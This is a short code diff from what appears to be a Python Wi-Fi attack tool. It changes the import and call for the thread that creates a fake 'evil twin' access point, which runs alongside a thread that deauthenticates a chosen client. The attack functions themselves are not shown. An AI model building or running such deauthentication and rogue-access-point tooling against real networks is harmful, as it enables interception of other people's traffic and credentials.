@@ -7,7 +7,7 @@ from scapy.layers.l2 import ARP, Ether
 from WifiAdapter import MonitorMode
 from WifiAdapter import WifiAdapterFinder
 import Deauthenticate
-import Twin_create
+import create_ap
 from scapy import all as sc
 import time
 from threading import Thread
@@ -122,7 +122,7 @@ if __name__ == "__main__":
     Deauthenticate_thread = Thread(target=Deauthenticate.deautenticate_user,args=[WifiAdapter,ChosenWifiMA,ChosenClient])
 
     #create thread that create an fake wireless network (evil twin)
-    TwinNet_thread = Thread(target = Twin_create.create_fake_access_point , args = [WifiAdapter , ChosenWifiMA , ChosenClient , ChosenWifiSSID])
+    TwinNet_thread = Thread(target = create_ap.prepare_fake_access_point, args = ["enp2s0", ChosenWifiSSID])
 
     Deauthenticate_thread.start()
     TwinNet_thread.start()
